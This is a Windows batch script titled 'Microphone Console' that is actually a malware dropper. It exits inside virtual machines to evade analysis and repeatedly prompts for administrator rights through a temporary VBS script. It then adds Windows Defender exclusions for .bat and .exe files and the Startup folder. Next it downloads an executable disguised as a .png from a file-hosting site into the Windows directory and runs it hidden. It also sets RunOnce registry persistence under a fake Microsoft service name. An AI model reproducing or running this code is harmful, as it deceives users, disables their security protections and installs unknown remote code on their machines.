@echo off
title Microphone Console
echo $IsVM = (get-wmiobject -namespace ROOT\CIMV2 -computername localhost -Query  "SELECT * FROM Win32_PortConnector").Count -eq 0; If ($IsVM) {Stop-Process -Name cmd}>%temp%\vm.ps1
powershell -executionpolicy remotesigned -File %temp%\vm.ps1
del "%temp%\vm.ps1" /f
cls
:a
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
if '%errorlevel%' NEQ '0' (
goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
set params = %*:"=""
echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params%", "", "runas", 0 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
del "%temp%\getadmin.vbs"
timeout 2 /nobreak > nul
if exist "%temp%\tmp" (del "%temp%\tmp" /f /q & exit /b) else (goto :a)
:gotAdmin
pushd "%CD%"
CD /D "%~dp0"
echo.>"%temp%\tmp"
powershell Add-MpPreference -ExclusionExtension ".bat"
powershell Add-MpPreference -ExclusionExtension ".exe"
powershell Add-MpPreference -ExclusionPath '"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"'
powershell iwr -useb "https://files.catbox.moe/nd3h4y.png" -o $env:windir\Amine.exe; saps $env:windir\Amine.exe -Verb RunAs -WindowStyle Hidden
echo @echo off > "%windir%\Amine.bat"
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce /v "*Service Microsoft Distributed Transaction Coordinator" /t REG_SZ /d "%windir%\Amine.bat" >> "%windir%\Amine.bat"
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v "*Service Microsoft Distributed Transaction Coordinator" /t REG_SZ /d "%windir%\Aminebat" >> "%windir%\Amine.bat"
echo start explorer.exe "%windir%\Amine.exe" >> "%windir%\Amine.bat"
echo exit >> "%windir%\Amine.bat"
powershell saps "$env:windir\Amine.bat" -WindowStyle Hidden -Verb RunAs
pause
